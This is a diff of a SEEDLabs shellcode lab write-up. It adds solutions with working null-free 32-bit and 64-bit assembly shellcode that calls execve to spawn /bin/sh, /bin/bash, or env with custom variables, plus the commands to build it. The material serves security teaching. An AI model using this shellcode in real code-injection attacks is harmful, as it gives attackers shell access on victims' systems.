@@ -1,5 +1,16 @@
 # SEEDLabs -- Shellcode Development Lab
 
+
+* [Overview](#overview)
+* [Task 1. Writing Shellcode](#task-1-writing-shellcode)
+  * [1a: An overview of the process](#1a-an-overview-of-the-process)
+  * [1b: Eliminating zeros from the shellcode](#1b-eliminating-zeros-from-the-shellcode)
+  * [1c: Providing arguments for system calls.](#1c-providing-arguments-for-system-calls)
+  * [1d. Providing environment variables for `execve()`](#1d-providing-environment-variables-for-execve)
+  * [Note: Calling convention](#note-calling-convention)
+* [Task 2. Using Code segment](#task-2-using-code-segment)
+* [Task 3: Writing 64-bit shellcode](#task-3-writing-64-bit-shellcode)
+
 ## Overview
 Shellcode is widely used in many attacks that involve code injection. Although we can easily find existing shellcode on the Internet, there are situations where we require a shellcode which has to satisfy certain conditions.
 
@@ -463,7 +474,7 @@ In the case of shellcode, we call `execve()` at the end of the shellcode. In fac
 
 From the [syscall man page](https://man7.org/linux/man-pages/man2/syscall.2.html), under "Architecture calling conventions", the first table shows us the assembly instruction to invoke a syscall.
 
-![syscall instruction](./img/syscall_instruction.png "syscall instruction")
+![syscall instruction](./img/syscall_instruction_x86.png "syscall instruction")
 
 From this, we see that the instruction `int 0x80` indeed triggers a syscall for the `i386` architecture. In addition, the syscall calls a function labelled by the number currently stored in `eax`.
 
@@ -471,7 +482,7 @@ Looking up a `x86` Linux syscall table, we see that `execve()` has a syscall num
 
 The second table in the [man page](https://man7.org/linux/man-pages/man2/syscall.2.html), tells us how to pass arguments into the function called by syscall.
 
-![syscall arguments](./img/syscall_args.png "syscall arguments")
+![syscall arguments](./img/syscall_args_x86.png "syscall arguments")
 
 In the `i386` architecture, we see that the arguments are taken from the registers `ebx`, `ecx`, `edx`, `esi`, `edi` and `ebp`, **in order**.
 
@@ -582,3 +593,112 @@ In this task, we want to use the above technique to run the command `/usr/bin/en
 aa=11
 bb=22
 ```
+
+Before writing any code, we roughly sketch how the string should eventually look like. The rough plan is shown below. 
+
+![myenv2 string](./img/myenv2_string.png "myenv2 string")
+
+Thus, the string will be 48 bytes long, and we set the place holder to be "`/usr/bin/env****argv****aa=11*bb=22*env1env2****`". The overall code `myenv2.s` is:
+
+```assembly
+section .text
+  global _start
+    _start:
+      BITS 32
+      jmp short two
+    one:
+      pop ebx
+      xor eax, eax
+      mov [ebx+0xc] , eax
+      mov [ebx+0x10], ebx
+      lea ecx, [ebx+0x10]
+      mov [ebx+0x14], eax
+      mov [ebx+0x1d], al
+      mov [ebx+0x23], al
+      lea eax, [ebx+0x18]
+      mov [ebx+0x24], eax
+      lea eax, [ebx+0x1e]
+      mov [ebx+0x28], eax
+      lea edx, [ebx+0x24]
+      xor eax, eax
+      mov [ebx+0x2c], eax
+      mov al,  0x0b
+      int 0x80
+    two:
+      call one
+      db '/usr/bin/env****argv****aa=11*bb=22*env1env2****'
+```
+The shellcode works as intended, and `objdump` verifies that there are no zeros.
+
+![myenv2 success](./img/myenv2_success.png "myenv2 success")
+![myenv2 objdump](./img/myenv2_objdump.png "myenv2 objdump")
+
+## Task 3: Writing 64-bit shellcode
+
+Writing shellcode in 64-bit is quite similar to writing 32-bit shellcode. The main difference are the registers available and the [calling convention](#note-calling-convention).
+
+In 64-bit architecture, a syscall is triggered via the `syscall` instruction, with the syscall number stored in `rax`.
+
+![syscall instruction 64-bit](./img/syscall_instruction_x86-64.png "syscall instruction 64-bit")
+
+The first three arguments for the command are taken from `rdi`, `rsi` and `rdx` respectively.
+
+![syscall arguments 64-bit](./img/syscall_args_x86-64.png "syscall arguments 64-bit")
+
+An example 64-bit shellcode is given in `mysh_64.s`.
+
+```assembly
+; mysh_64.s
+
+section .text
+  global _start
+    _start:
+      ; The following code calls execve("/bin/sh", ...)
+      xor  rdx, rdx        ; 3rd argument
+      push rdx
+      mov  rax,'/bin//sh'
+      push rax
+      mov  rdi, rsp        ; 1st argument
+      push rdx 
+      push rdi
+      mov  rsi, rsp        ; 2nd argument
+      xor  rax, rax
+      mov   al, 0x3b       ; execve()
+      syscall
+```
+
+To compile the code into an executable, we use the commands
+
+```bash
+$ nasm -f elf64 -o mysh_64.o mysh_64.s
+$ ld -o mysh_64 mysh_64.o
+```
+
+In this task, we want to repeat [Task 1b](#1b-eliminating-zeros-from-the-shellcode) but in 64-bit shellcode. The approach is similar, where we simply reference the lowest 8 bits of `rax` via `al`.
+
+```assembly
+; mysh_bash_64.s
+
+section .text
+  global _start
+    _start:
+      ; The following code calls execve("/bin/bash", ...)
+      xor  rdx, rdx       ; 3rd argument
+      push rdx
+      mov  al,'h'
+      push rax
+      mov  rax,'/bin/bas'
+      push rax
+      mov  rdi, rsp        ; 1st argument
+      push rdx 
+      push rdi
+      mov  rsi, rsp        ; 2nd argument
+      xor  rax, rax
+      mov  al, 0x3b        ; execve()
+      syscall
+```
+The shellcode works as intended, and `objdump` verifies that there are no zeros.
+
+![mysh_bash_64 success](./img/mysh_bash_64_success.png "mysh_bash_64 success")
+![mysh_bash_64 objdump](./img/mysh_bash_64_objdump.png "mysh_bash_64 objdump")
+
